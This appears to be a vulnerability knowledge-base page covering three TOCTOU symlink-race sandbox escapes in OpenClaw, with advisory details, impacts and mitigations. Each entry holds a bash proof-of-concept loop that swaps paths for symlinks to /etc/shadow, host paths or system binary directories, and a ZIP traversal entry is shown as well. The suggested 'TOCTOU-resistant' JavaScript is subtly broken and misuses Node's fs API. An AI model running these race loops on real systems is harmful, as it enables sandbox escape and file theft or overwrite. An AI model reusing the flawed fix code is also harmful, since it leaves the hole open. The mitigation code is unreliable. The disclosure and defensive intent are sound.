# TOCTOU (Time-of-Check to Time-of-Use) Vulnerabilities

## Overview

TOCTOU (Time-of-Check to Time-of-Use) attacks exploit race conditions between path validation (Check) and file operations (Use) by replacing symlinks during the race window to bypass sandbox boundaries. This represents a **new attack pattern** beyond traditional static symlink/hardlink bypasses, discovered and fixed in v2026.3.1-3.2.

TOCTOU attacks are particularly dangerous because they:
- Bypass sandbox boundaries even when static path validation is correct
- Require only timing precision (millisecond race windows)
- Work against well-designed security functions like `writeFileWithinRoot`

## Statistics

| Metric | Value |
|--------|-------|
| Total Vulnerabilities | 3 TOCTOU vulnerabilities |
| Severity Distribution | Medium: 3 |
| Affected Versions | v2026.3.0 and earlier |
| Latest Fix Version | >= v2026.3.2 |
| Impact | Sandbox Escape, Arbitrary File Read/Write |

## Attack Principle

```
[Normal Flow]
1. Application validates path "/sandbox/file.txt" → OK (inside sandbox)
2. Application writes to path "/sandbox/file.txt"

[TOCTOU Attack]
1. Application validates path "/sandbox/file.txt" → OK (inside sandbox)
   ← Attacker replaces "/sandbox/file.txt" with symlink to "/etc/passwd" at this moment
2. Application writes to path "/sandbox/file.txt" → Actually writes to "/etc/passwd"
```

The race window is typically a few milliseconds, but attackers can increase success probability by:
- Running the attack in a tight loop
- Using multiple threads to maximize timing coverage
- Exploiting system slowdowns (high CPU load, I/O contention)

---

## Vulnerability List

### GHSA-7xmq-g46g-f8pv: Sandbox Media TOCTOU

| Property | Value |
|----------|-------|
| Severity | Medium |
| CVE | None |
| Fixed In | >= 2026.3.1 |
| Category | TOCTOU / Sandbox Escape |
| Target | Sandbox media file read operations |

**Description**:
Sandbox media file read operations had a race window between path validation and file read. An attacker could replace a validated path with a symlink to an out-of-sandbox file during this window.

**Impact**:
- Arbitrary file read outside sandbox boundaries
- Credential theft (config files, secrets)
- Information disclosure

**Attack Scenario**:
```bash
# 1. Create legitimate file in sandbox
echo "legitimate" > /sandbox/media/file.txt

# 2. Race condition exploit (tight loop)
while true; do
  # Replace with symlink to sensitive file
  rm /sandbox/media/file.txt
  ln -s /etc/shadow /sandbox/media/file.txt
  # Restore original file
  rm /sandbox/media/file.txt
  echo "legitimate" > /sandbox/media/file.txt
done &

# 3. OpenClaw attempts to read /sandbox/media/file.txt
# → Some percentage of reads will catch the symlink state → reads /etc/shadow
```

**Mitigation**:
- Update to >= v2026.3.1 which uses atomic file operations with O_NOFOLLOW
- Enable sandbox mode: `openclaw config set sandbox all`

**References**:
- [GHSA-7xmq-g46g-f8pv](https://github.com/openclaw/openclaw/security/advisories/GHSA-7xmq-g46g-f8pv)
- [Sandbox Escape Testing Guide](../test-cases/sandbox-escape-guide.md#test-5)

---

### GHSA-x82f-27x3-q89c: writeFileWithinRoot TOCTOU Symlink Race

| Property | Value |
|----------|-------|
| Severity | Medium |
| CVE | None |
| Fixed In | >= 2026.3.1 |
| Category | TOCTOU / Sandbox Escape |
| Target | writeFileWithinRoot function |

**Description**:
`writeFileWithinRoot` is designed to guarantee file writes only within sandbox root. However, a race window existed between path validation and file write operations, allowing symlink replacement to write outside sandbox boundaries.

**Impact**:
- Arbitrary file creation outside sandbox
- File truncation (0-byte overwrite) for DoS
- Security configuration overwrite

**Attack Scenario**:
```bash
# Proof-of-concept attack script
# 1. Create directory in sandbox
mkdir -p /sandbox/workspace/target_dir

# 2. Race condition exploit (replace directory with symlink)
while true; do
  rm -rf /sandbox/workspace/target_dir
  ln -s /host/sensitive/path /sandbox/workspace/target_dir
  mkdir -p /sandbox/workspace/target_dir
done &

# 3. writeFileWithinRoot attempts to write to "/sandbox/workspace/target_dir/file"
# → Some writes will catch the symlink state → writes to "/host/sensitive/path/file"
```

**Mitigation**:
- Update to >= v2026.3.1 which uses O_NOFOLLOW and directory file descriptor validation
- Avoid writing to user-controlled directory structures

**References**:
- [GHSA-x82f-27x3-q89c](https://github.com/openclaw/openclaw/security/advisories/GHSA-x82f-27x3-q89c)
- [Sandbox Escape Testing Guide](../test-cases/sandbox-escape-guide.md#test-5)

---

### GHSA-r54r-wmmq-mh84: ZIP Extraction Race via Parent Symlink Rebind

| Property | Value |
|----------|-------|
| Severity | Medium |
| CVE | None |
| Fixed In | >= 2026.3.2 |
| Category | TOCTOU / Path Traversal |
| Target | ZIP/archive extraction |

**Description**:
During ZIP archive extraction, an attacker could replace the parent directory symlink to redirect writes to unintended locations.

**Impact**:
- Write files outside intended destination
- Skill installation abuse to write outside sandbox
- Arbitrary code execution via overwriting executable files

**Attack Scenario**:
```bash
# Malicious ZIP structure
malicious.zip:
  └── ../../evil/payload.sh  # Path traversal attempt

# Attack:
# 1. Create extraction directory
mkdir -p /sandbox/extract/subdir

# 2. Race to replace parent with symlink
while true; do
  rm -rf /sandbox/extract
  ln -s /host/system/bin /sandbox/extract
  mkdir -p /sandbox/extract/subdir
done &

# 3. ZIP extraction writes to /sandbox/extract/subdir/...
# → Some extractions catch symlink state → writes to /host/system/bin/...
```

**Mitigation**:
- Update to >= v2026.3.2 which validates parent directory stability during extraction
- Only install skills from trusted sources

**References**:
- [GHSA-r54r-wmmq-mh84](https://github.com/openclaw/openclaw/security/advisories/GHSA-r54r-wmmq-mh84)
- [Sandbox Escape Testing Guide](../test-cases/sandbox-escape-guide.md#test-6)

---

## Related Static Symlink Bypasses

TOCTOU attacks build upon traditional static symlink manipulation techniques:

| GHSA ID | Severity | Technique | Fixed In |
|---------|----------|-----------|----------|
| GHSA-qcc4-p59m-p54m | High | Dangling symlink | 2026.2.26 |
| GHSA-mgrq-9f93-wpp5 | High | Non-existent symlink leaf | 2026.2.26 |
| GHSA-3jx4-q2m7-r496 | High | Hardlink alias | 2026.2.25 |
| GHSA-cfvj-7rx7-fc7c | Medium | stageSandboxMedia traversal | 2026.3.2 |

**Key Difference**: Static symlink attacks rely on pre-existing symlinks passing validation, while TOCTOU attacks **create symlinks after validation** during the race window.

---

## Attack Pattern Evolution

```
Phase 1: Static Symlink/Hardlink Bypass (v2026.1.x ~ v2026.2.x)
├── Dangling symlinks (GHSA-qcc4)
├── Non-existent symlink leaf (GHSA-mgrq)
├── Hardlink alias (GHSA-3jx4)
└── Path traversal (../ in paths)

Phase 2: Dynamic TOCTOU Attacks (v2026.3.1 discovered & fixed)
├── Sandbox media TOCTOU (GHSA-7xmq)
├── writeFileWithinRoot symlink race (GHSA-x82f)
└── ZIP extraction race (GHSA-r54r, fixed in v2026.3.2)

Phase 3: ACP Inheritance Bypass (v2026.3.1-3.2 discovered & fixed)
├── sessions_spawn sandbox inheritance bypass
└── Host ACP session initialization bypass
```

---

## Defense Strategy

### Immediate Actions
1. **Update to Latest Version**: Upgrade to >= v2026.3.2 to apply TOCTOU fixes
2. **Enable Sandbox Mode**: `openclaw config set sandbox all` to limit blast radius
3. **Audit File Operations**: Review code that writes to user-controlled paths

### Technical Mitigations (For Developers)

**Use Atomic File Operations**:
```javascript
// BEFORE (vulnerable to TOCTOU):
if (isPathWithinRoot(path)) {
  fs.writeFileSync(path, data);  // Race window here
}

// AFTER (TOCTOU-resistant):
const fd = fs.openSync(path, 'w', { flag: O_NOFOLLOW | O_CREAT | O_EXCL });
fs.writeSync(fd, data);
fs.closeSync(fd);
```

**Use Directory File Descriptors**:
```javascript
// Open parent directory first
const dirFd = fs.openSync(parentDir, 'r', { flag: O_DIRECTORY });

// Validate parent hasn't been replaced
verifyDirectoryIdentity(dirFd, parentDir);

// Perform operations relative to dirFd (prevents TOCTOU)
fs.writeFileSync('filename', data, { fd: dirFd });
```

**Avoid Following Symlinks**:
- Use `O_NOFOLLOW` flag for all file operations
- Use `lstat()` instead of `stat()` to detect symlinks
- Reject operations on symlinks entirely in security-critical paths

### Long-Term Solutions
- Implement capability-based file access (no path-based operations)
- Use filesystem sandboxing (e.g., seccomp-bpf, Landlock)
- Consider stateless verification (cryptographic checksums)

---

## Related Resources

- [TOCTOU Sandbox Bypass Research](../../knowledge/vulnerabilities/sandbox-escape/2026-03-12-toctou-sandbox-bypass.md)
- [Sandbox Escape Testing Guide](../test-cases/sandbox-escape-guide.md)
- [Hardening Guide](../best-practices/hardening-guide.md)
- [OpenClaw Security Advisories](https://github.com/openclaw/openclaw/security/advisories)

---

**Last Updated**: 2026-03-15
**Database Version**: vulnerability-db.json (2026-03-11, 3 TOCTOU entries)
